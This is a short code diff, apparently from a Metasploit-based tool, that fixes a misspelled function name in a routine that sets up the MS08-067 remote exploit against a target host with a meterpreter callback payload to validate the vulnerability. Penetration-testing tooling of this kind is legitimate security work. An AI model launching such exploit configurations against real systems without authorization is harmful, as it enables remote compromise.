@@ -80,7 +80,7 @@ def validate_ms08_067(vuln)
     mod = ms08_067_netapi_mod
     mod.datastore['RHOST'] = vuln.host.address
     mod.datastore['RPORT'] = vuln.service ? vuln.service.port : 445
-    mod.datastore['PAYLOAD'] = get_x86_ayload_name
+    mod.datastore['PAYLOAD'] = get_x86_payload_name
     mod.datastore['LHOST'] = get_lhost
     mod.datastore['LPORT'] = get_x86_meterpreter_port
     print_status("Validating MS08-067 on #{mod.datastore['RHOST']}:#{mod.datastore['RPORT']} with #{mod.datastore['PAYLOAD']} on port #{mod.datastore['LPORT']}")
